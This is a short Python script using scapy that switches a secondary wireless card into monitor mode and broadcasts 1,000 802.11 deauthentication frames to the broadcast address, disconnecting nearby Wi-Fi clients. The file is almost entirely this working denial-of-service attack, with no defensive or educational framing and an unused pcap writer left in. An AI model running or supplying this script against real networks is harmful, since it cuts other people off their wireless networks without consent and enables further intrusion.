#!/usr/bin/env python
import sys
from scapy import *
from scapy.all import *
import psutil
from scapy.utils import PcapWriter

pktdump = PcapWriter("banana.pcap", append=True, sync=True)
destination_addr = 'ff:ff:ff:ff:ff:ff' # i.e. broadcast
bss_id_addr = 'ff:ff:ff:ff:ff:ff'
def deauth(interface):
    dot11 = Dot11(addr1=destination_addr, addr2=bss_id_addr, addr3=bss_id_addr)
    pkt = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(pkt, iface=interface, inter=0.1, count=1000, verbose=1)


# Changes wireless adapters from managed to monitor
def change_mode(interface):
        os.system(f"ifconfig {interface} down")
        os.system(f"iwconfig {interface} mode monitor")
        os.system(f"ifconfig {interface} up")


# Gets Wireless adapters that aren't the main wifi card.
# Could be an issue as I made the assumption that the first card is the main card
def get_interfaces():
    addresses = psutil.net_if_addrs()
    stats = psutil.net_if_stats()

    wireless_interfaces = []
    for intface, addr_list in addresses.items():
        if  intface[:2] == "wl":
            wireless_interfaces.append(intface)
    return wireless_interfaces


interface = get_interfaces()[1]
print(interface)
change_mode(interface)
tracking = {}
print ("About to deauth\n\n")
deauth(interface)